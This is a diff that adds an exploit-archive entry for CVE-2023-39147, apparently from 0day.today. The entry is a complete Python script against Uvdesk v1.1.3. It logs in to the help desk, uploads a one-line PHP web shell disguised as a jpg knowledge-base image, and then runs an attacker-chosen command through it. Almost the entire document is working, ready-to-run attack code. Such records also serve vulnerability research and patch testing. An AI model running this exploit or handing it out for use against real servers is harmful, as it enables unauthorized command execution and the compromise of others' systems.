@@ -1,0 +1,61 @@
+id: 38920
+date: 07/31/2023
+title: Uvdesk v1.1.3 - File Upload Remote Code Execution (Authenticated) Exploit
+author: Daniel Barros
+cves: CVE-2023-39147
+
+# Exploit Title: Uvdesk v1.1.3 - File Upload Remote Code Execution (RCE) (Authenticated)
+# Exploit Author: Daniel Barros (@cupc4k3d) - Hakai Offensive Security 
+# Vendor Homepage: https://www.uvdesk.com
+# Software Link: https://github.com/uvdesk/community-skeleton
+# Version: 1.1.3
+# Example: python3 CVE-2023-39147.py -u "http://$ip:8000/" -c "whoami"
+# CVE : CVE-2023-39147
+# Tested on: Ubuntu 20.04.6
+
+
+import requests
+import argparse
+
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', '--url', required=True, action='store', help='Target url')
+    parser.add_argument('-c', '--command', required=True, action='store', help='Command to execute')
+    my_args = parser.parse_args()
+    return my_args
+
+def main():
+    args = get_args()
+    base_url = args.url
+
+    command = args.command
+    uploaded_file = "shell.php"
+    url_cmd = base_url + "//assets/knowledgebase/shell.php?cmd=" + command
+
+# Edit your credentials here
+    login_data = {
+        "_username": "admin@adm.com",
+        "_password": "passwd",
+        "_remember_me": "off"
+    }
+
+    files = {
+        "name": (None, "pwn"),
+        "description": (None, "xxt"),
+        "visibility": (None, "public"),
+        "solutionImage": (uploaded_file, "<?php system($_GET['cmd']); ?>", "image/jpg")
+    }
+
+    s = requests.session()
+    # Login
+    s.post(base_url + "/en/member/login", data=login_data)
+    # Upload
+    upload_response = s.post(base_url + "/en/member/knowledgebase/folders/new", files=files)
+    # Execute command
+    cmd = s.get(url_cmd)
+    print(cmd.text)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-08-05]  #
